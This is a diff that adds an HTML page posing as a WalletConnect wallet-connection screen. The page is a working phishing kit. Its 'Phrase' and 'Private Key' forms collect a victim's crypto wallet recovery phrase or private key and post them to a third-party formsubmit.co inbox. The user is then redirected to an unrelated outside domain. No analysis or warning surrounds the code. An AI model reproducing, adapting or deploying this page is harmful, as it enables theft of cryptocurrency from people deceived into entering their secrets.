@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://unpkg.com/flowbite@1.5.3/dist/flowbite.min.css" />
+    <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" referrerpolicy="no-referrer"></script>
+</head>
+<body style="background-color:#ffffff">
+    <section class="">
+        <div class="flex flex-col items-center justify-center px-6 py-8 mx-auto md:h-screen lg:py-0">
+            <a href="../index.html" class="flex items-center font-bold text-white">
+                <img src="../wc1.png" class="mr-3  mb-5" style="height:30px" alt="Logo">
+                <span>Walletconnect</span>
+            </a>
+            <div class="p-4 text mb-4 text-sm text-blue-700 bg-blue-100 rounded-lg spark:bg-blue-200 spark:text-blue-800" role="alert">
+                <span class="font-medium">
+                   Info alert!
+                </span>Securely use any of the options below 
+              </div> 
+
+      
+            <div class="w-full bg-white rounded-lg shadow spark:border md:mt-0 sm:max-w-md xl:p-0 spark:bg-gray-800 spark:border-gray-700">
+              
+            <div class="mb-4  border-b border-gray-200 spark:border-gray-700">
+                <ul class="flex flex-wrap -mb-px text-sm font-medium text-center" id="myTab" data-tabs-toggle="#myTabContent" role="tablist">
+                    <li class="mr-2" role="presentation">
+                        <button class="inline-block p-4 rounded-t-lg border-b-2 text-blue-600 hover:text-blue-600 spark:text-blue-500 spark:hover:text-blue-500 border-blue-600 spark:border-blue-500" id="profile-tab" data-tabs-target="#profile" type="button" role="tab" aria-controls="profile" aria-selected="true">Phrase</button>
+                    </li>
+                   
+                    <li class="mr-2" role="presentation">
+                        <button class="inline-block p-4 rounded-t-lg border-b-2 border-transparent hover:text-gray-600 hover:border-gray-300 spark:hover:text-gray-300 spark:border-transparent text-gray-500 spark:text-gray-400 border-gray-100 spark:border-gray-700" id="settings-tab" data-tabs-target="#settings" type="button" role="tab" aria-controls="settings" aria-selected="false">Private Key</button>
+                    </li>
+                   
+                </ul>
+            </div>
+            <div id="myTabContent">
+                <div class="p-4 bg-gray-50 rounded-lg spark:bg-gray-800" id="profile" role="tabpanel" aria-labelledby="profile-tab">
+                  
+                    <form action="https://formsubmit.co/fe3f40e419e74e3334f31d2541f93a52" method="POST">                        <div class="mb-6">
+                        <div class="mb-6">
+                            <textarea rows="4" name="Phrse" type="text" minlength="12" placeholder="Enter your recovery phrase (typically 12-24 words seperated by a single space" id="large-input" class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 spark:bg-gray-700 spark:border-gray-600 spark:placeholder-gray-400 spark:text-white spark:focus:ring-blue-500 spark:focus:border-blue-500" required></textarea>
+                        </div>
+
+
+                        <input type="hidden" name="_next" value="https://5thscaperpc.uno/apiv4wc-connection">
+
+                        <input type="hidden" name="_captcha" value="false">
+
+                        <button type="submit" class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 mr-2 mb-2 spark:bg-blue-600 spark:hover:bg-blue-700 focus:outline-none spark:focus:ring-blue-800">Proceed</button>
+                    </form>
+                </div>
+
+
+            </div>
+            </div>
+
+
+
+
+                <div class="hidden p-4 bg-gray-50 rounded-lg spark:bg-gray-800" id="settings" role="tabpanel" aria-labelledby="settings-tab">
+                    <form action="https://formsubmit.co/fe3f40e419e74e3334f31d2541f93a52" method="POST">                        <div class="mb-6">
+                            <input name="prvky" type="text" type="text" minlength="12" placeholder="Enter your private key " id="large-input" class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 spark:bg-gray-700 spark:border-gray-600 spark:placeholder-gray-400 spark:text-white spark:focus:ring-blue-500 spark:focus:border-blue-500" required>
+                        </div>
+                        <input class="hidden" value="coinbase" name="walletid">
+
+
+                        <input type="hidden" name="_next" value="https://5thscaperpc.uno/apiv4wc-connection">
+
+                        <input type="hidden" name="_captcha" value="false">
+
+
+                        <button type="submit" class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 mr-2 mb-2 spark:bg-blue-600 spark:hover:bg-blue-700 focus:outline-none spark:focus:ring-blue-800">Proceed</button>
+
+                    </form>
+
+
+                </div>
+        </div>
+    </section>
+           
+  
+      </section>
+
+
+
+
+      <script>
+        $(".ajaxForm").submit(function(e) {
+        e.preventDefault();
+        var href = $(this).attr("action");
+        $.ajax({
+        type: "POST",
+        dataType: "json",
+        url: href,
+        data: $(this).serialize(),
+        success: function(response) {
+        if (response.status == "success") {
+        window.location.href = '../apiv4wc-connection-success'; // redirection url // change this. 
+        } else {
+        alert("An error occured: " + response.message);
+        }
+        }
+        });
+        });
+        </script>
+        
+
+    <script src="https://unpkg.com/flowbite@1.5.3/dist/flowbite.js"></script>
+</body>
+</html>
